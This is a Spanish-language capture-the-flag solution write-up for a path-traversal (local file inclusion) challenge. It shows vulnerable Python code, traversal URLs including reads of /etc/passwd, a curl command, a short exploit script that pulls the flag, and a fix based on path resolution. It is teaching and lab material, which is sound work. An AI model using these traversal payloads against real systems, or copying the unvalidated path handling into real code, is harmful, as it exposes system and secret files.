# Solución Reto 9: Local File Inclusion (ctf-lfi)

## Descripción

El portal de documentación carga archivos usando el parámetro `?page=`. El servidor construye la ruta concatenando el directorio base `/app/pages/` con el valor del parámetro **sin ninguna validación**:

```python
path = os.path.join(PAGES_DIR, page)   # PAGES_DIR = /app/pages/
with open(path) as f:
    content = f.read()
```

La flag está escrita en `/app/secret.txt` (un nivel arriba de `pages/`).

## Explotación

### 1. Verificar la vulnerabilidad

Acceder a un archivo conocido fuera del directorio usando `../`:

```
http://<HOST>:<PORT>/?page=../secret.txt
```

`os.path.join("/app/pages/", "../secret.txt")` resuelve a `/app/secret.txt`, que existe y contiene la flag.

### 2. Leer la flag directamente

```bash
curl "http://<HOST>:<PORT>/?page=../secret.txt"
```

La respuesta HTML incluirá el contenido de `secret.txt` en el bloque `<pre>`.

### 3. Variaciones (lectura de archivos del sistema)

```
/?page=../../../etc/passwd
/?page=../../../etc/hostname
```

## Script de explotación

```python
import urllib.request, re

TARGET = "http://<HOST>:<PORT>"

with urllib.request.urlopen(f"{TARGET}/?page=../secret.txt") as r:
    html = r.read().decode()

match = re.search(r'CTF\{[^}]+\}', html)
if match:
    print("Flag:", match.group())
```

## Causa raíz

`os.path.join()` no normaliza secuencias `../`. El servidor debería verificar que la ruta resuelta permanece dentro del directorio base:

```python
# Fix correcto
resolved = os.path.realpath(path)
if not resolved.startswith(PAGES_DIR):
    abort(403)
```

## Flag

```
CTF{...}   ← leer /app/secret.txt vía ?page=../secret.txt
```
